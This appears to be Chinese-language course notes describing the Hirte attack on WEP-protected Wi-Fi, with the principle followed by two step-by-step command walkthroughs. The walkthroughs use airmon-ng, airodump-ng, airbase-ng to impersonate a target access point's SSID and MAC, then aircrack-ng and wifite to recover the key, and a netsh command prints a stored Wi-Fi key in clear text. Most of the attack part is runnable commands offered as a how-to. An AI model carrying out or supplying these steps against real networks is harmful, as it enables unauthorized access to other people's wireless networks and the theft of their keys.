# WEP-渗透WEP新思路--Hirte

## 1.Hirte介绍

Hirte是破解无线网络WEP Key的一种攻击类型

只要客户端设备（笔记本电脑，手机等）连接过的无线网络，那些WIFI即使是不在攻击者范围内也都能被破解，因为该wifi的WEP密钥和配置文件仍然存储在这些无线设备中。

```
  netsh wlan show profile name="cisco-1809" key=clear    
```

实施这种攻击的要求是建立一个和WEP网络相同的SSID假冒接入点。当客户端设备尝试自动连接到无线网络设时，假冒接入点（攻击者机器）会对受害者设备进行ARP攻击，导致受害者设备将包含密钥流的数据包发出。

## 2.Hirte破解原理

1.安装一个假的WEP AP(wifi名,mac地址要相同)并等待客户端连接

2.客户端的连接等待自动分配IP地址

3.客户端发送一个ARP数据包

4.获得了ARP分组，并且将其转换成一个ARP请求为同一客户机

5.客户回复

6.收集这些数据包

7.破解WEP密钥

## 3.渗透姿势1

#### 1.查看网卡信息

```
ip a
```

#### 2.监听网卡

```
airmon-ng start wlan0
```

#### 3.扫描附近的wifi

```
airodump-ng wlan0mon
```

#### 4.配置airodump-ng捕捉数据包并保存数据包文件名字为HSEK

```
airodump-ng wlan0mon --bssid   D8:24:BD:79:18:0B --write HSEK
--bssid：AP的mac地址
--write：保存文件
```

#### 5.开始伪造AP,用airbase-ng工具建立WEP接入点

```
airbase-ng -c 1 -a  D8:24:BD:79:18:0B --essid "cisco-1809" -W 1 -N wlan0mon
-c:信道
-a：模拟AP的MAC地址
--essid：wifi的名称
-W:设置加密位
-N:使Hirte攻击模式
wlan0mon：是接口
```

#### 6.只要有客户端一连上来,就会进行攻击

![image-20211126191930629](https://image.201068.xyz/assets/image-20211126191930629.png)

![image-20211126191947433](https://image.201068.xyz/assets/image-20211126191947433.png)

#### 7.启动aircrack-ng从捕获的数据包：Hirte破解WEP密钥

```
aircrack-ng HSEK-01.cap
```

破解密码是有要求的,第一次ivs必须要大于5000,当小于这个数的话,就会提示

![image-20211126192040363](https://image.201068.xyz/assets/image-20211126192040363.png)

![image-20211126192054536](https://image.201068.xyz/assets/image-20211126192054536.png)

## 4.渗透姿势2

#### 1.扫描并指定破解方式

```
wifite  -wep -hirte
```

#### 2.加速ivs收集

```
ping -t 192.168.1.1
```

#### 3.开启攻击脚本

```
启动cmd.py
```

#### 4.获得密钥

![image-20211126192808198](https://image.201068.xyz/assets/image-20211126192808198.png)

## 5.课堂小结

参考：课后笔记